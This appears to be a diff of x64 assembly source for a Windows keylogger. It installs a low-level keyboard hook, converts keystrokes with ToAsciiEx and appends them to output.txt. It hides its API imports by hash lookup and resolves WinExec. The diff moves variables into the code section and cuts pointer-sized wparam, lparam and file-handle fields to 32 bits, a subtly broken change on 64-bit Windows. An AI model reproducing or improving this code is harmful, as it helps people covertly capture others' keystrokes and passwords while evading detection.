@@ -7,11 +7,37 @@ EXTERN CalcHash          : PROC
 EXTERN FindK32Addr       : PROC
 EXTERN HashResolver      : PROC
 EXTERN writeTofile       : PROC
+    
 
-
-.data
-    chget                   DB   41h
-    WM_KEYDOWN              EQU 00000100h
+.code
+	chget                   DB   41h
+;Address of library
+    k32address              QWORD 0
+    u32address              QWORD 0
+;k32 functions
+    loadlibrary             QWORD 0
+    createfile              QWORD 0
+    writefile               QWORD 0
+    getmodulehandle         QWORD 0
+    closehandle             QWORD 0
+    winexec                 QWORD 0
+;u32 functions
+    setwindowhookex         QWORD 0
+    callnexthook            QWORD 0
+    toasciiex               QWORD 0
+    getkeyboardlayout       QWORD 0
+    getkeystate             QWORD 0
+    getkeyboardstate        QWORD 0
+    getmessage              QWORD 0
+;other uninitialized variables
+    wparam                  DWORD 0
+    lparam                  DWORD 0
+    vk_code                 DWORD 0
+    callcode                DWORD 0
+    vk_scanCode             DWORD 0
+    keyBoardHL              DWORD 0
+    hfile                   DWORD 0
+	WM_KEYDOWN              EQU 00000100h
     FILE_APPEND_DATA        EQU 00000004h
     FILE_SHARE_READ         EQU 00000001h
     OPEN_ALWAYS             EQU 00000004h
@@ -19,6 +45,7 @@ EXTERN writeTofile       : PROC
     WH_KEYBOARD_LL          EQU 0000000dh
     INVALID_HANDLE_VALUE    EQU 0FFFFFFFFh
     state                   BYTE 256 dup(0)
+
     ;hash table---------------------------;
     ;k32 hash
     LOADLIBRARYH            DD 0EC0E4E8Eh
@@ -39,36 +66,6 @@ EXTERN writeTofile       : PROC
     filename                DB "output.txt",0
     u32str                  DB "User32.dll",0
     ;--------------------------------------;
-.data?
-;Address of library
-    k32address              QWORD ?
-    u32address              QWORD ?
-;k32 functions
-    loadlibrary             QWORD ?
-    createfile              QWORD ?
-    writefile               QWORD ?
-    getmodulehandle         QWORD ?
-    closehandle             QWORD ?
-    winexec                 QWORD ?
-;u32 functions
-    setwindowhookex         QWORD ?
-    callnexthook            QWORD ?
-    toasciiex               QWORD ?
-    getkeyboardlayout       QWORD ?
-    getkeystate             QWORD ?
-    getkeyboardstate        QWORD ?
-    getmessage              QWORD ?
-;other uninitialized variables
-    wparam                  QWORD ?
-    lparam                  QWORD ?
-    vk_code                 DWORD ?
-    callcode                DWORD ?
-    vk_scanCode             DWORD ?
-    keyBoardHL              DWORD ?
-    hfile                   QWORD ?
-    ;-----------------------------------------;
-
-.code
 
 public createfile
 public writefile
@@ -80,8 +77,8 @@ lowlevelkeyboard PROC
     mov rbp,rsp                                     ; rbp is the frame pointer (it's not mandatory in 64 bit mode) 
     sub rsp,48                                      ; space needed for calling a function with max 6 argument
     mov callcode, ecx                               ; save code
-    mov wparam, rdx                                 ; save wparam
-    mov lparam, r8                                  ; save lparam
+    mov wparam, edx                                 ; save wparam
+    mov lparam, r8d                                  ; save lparam
     cmp rdx, WM_KEYDOWN                             ; check if wparam is equal to 100h
     jnz fine                                        ; if not equal jump to the end
     ;-----------------------------------;
